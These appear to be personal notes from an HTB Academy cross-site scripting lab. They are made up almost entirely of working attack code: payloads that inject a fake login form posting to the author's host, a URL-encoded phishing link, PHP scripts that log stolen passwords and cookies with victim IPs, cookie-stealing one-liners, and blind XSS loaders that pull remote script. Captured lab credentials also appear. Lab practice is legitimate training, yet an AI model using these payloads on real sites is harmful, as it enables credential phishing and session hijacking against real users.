## HTB-ACADEMY (XSS)
## Ivan Medina
___
### PHISHING
___
```
%27%3E%3CD3v%0AonPoINTErENter+=+[8].find(confirm)%0Dx%3E%3Cscript%3Edocument.write('<h3>Please login to continue</h3><form action=http://10.10.14.19:82/interceptor.php><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();%3C/script%3E%3C!--v3dm0s
```
```
%27%3E%3CD3v%0AonPoINTErENter+=+[8].find(confirm)%0Dx%3E%3Cscript%3Edocument.write("Please login to continue");%3C/script%3E%3C!--v3dm0s
```
```
' onerror='document.write('<h3>Please login to continue</h3><form action=http://10.10.14.19:82/interceptor.php><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```
#### Crafting Login Payload

```
<!-- ' onerror='document.write('<h3>Please login to continue</h3>
<form action=http://10.10.14.19:82/interceptor.php>
<input type='username' name='username' placeholder='Username'>
<input type='password' name='password' placeholder='Password'>
<input type='submit' name='submit' value='Login'>
</form>
<!--') -->
```

#### BUG TEST 01

```
' onerror='document.write("")
```

#### Payload Login

```
<form action='http://10.10.14.19:82/interceptor.php'><input type='username' name='username' placeholder='Username'><input type='password' name='password' placeholder='Password'><input type='submit' name='submit' value='Login'></form>
```

```
' onerror='document.write("<h3>Please login to continue</h3>");alert()
```

#### Code to handle credentials

```
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://http://10.129.121.32/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

```
' onerror='document.write(`<h3 style=&quot;color:red&quot;>Please login to continue</h3>`);alert()
```

#### PAYLOAD TO GENERATE LOGIN

```
' onerror='document.write(`<h3 style=&quot;color:red&quot;>Please login to continue</h3><form action="http://10.10.14.19:82/interceptor.php"><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>`);
```

#### Error 1

Esta escribiendo un nuevo documento y se necesita que sea el mismo para que send.php lo pueda enviar

Only Payload
```
'><script>document.write('<h3 style=&quot;color:red&quot;>Please login to continue</h3><form action="http://10.10.14.19:82/interceptor.php"><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById("urlform").remove();</script><!--
```

URL Payload

```
http://10.129.121.32/phishing/index.php?url=%27%3E%3Cscript%3Edocument.write%28%27%3Ch3+style%3D%26quot%3Bcolor%3Ared%26quot%3B%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3D%22http%3A%2F%2F10.10.14.19%3A82%2Finterceptor.php%22%3E%3Cinput+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E%27%29%3Bdocument.getElementById%28%22urlform%22%29.remove%28%29%3B%3C%2Fscript%3E%3C%21--
```

GET /interceptor.php?username=admin&password=p1zd0nt57341myp455&submit=Login
___

### Session Hijacking
___

#### Payloads to grab cookies

```
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

#### Interceptor cookie

```
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

#### Common Blind Payloads

```
<script src='http://10.10.14.19:8080'></script>
'><script src='http://10.10.14.19:8080'></script>
"><script src='http://10.10.14.19:8080'></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\''http://10.10.14.19:8080'\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//10.10.14.19:8080");a.send();</script>
<script>$.getScript("'http://10.10.14.19:8080'")</script>
```

#### Payload to grab cookie
```
<script>new Image().src="http://10.10.14.19:8080/intereceptor.php?c="+document.cookie;</script>
```

#### Payloads tested
```
"><script src=http://10.10.14.19:8080/fulllname></script>
"><script src=http://10.10.14.19:8080/username></script>
"><script src=http://10.10.14.19:8080/url></script>
```

#### Payloads winner

```
"><script>new Image().src="http://10.10.14.19:8080/interceptor.php?c="+document.cookie;</script>
```
```
GET /interceptor.php?c=cookie=c00k1355h0u1d8353cu23d
```

#### Sills Assessment

#### Payloads and input

```
"><script src=http://10.10.14.19:8080/website></script>
```

#### Final Payload

```
"><script>new Image().src="http://10.10.14.19:8080/interceptor.php?c="+document.cookie;</script>
```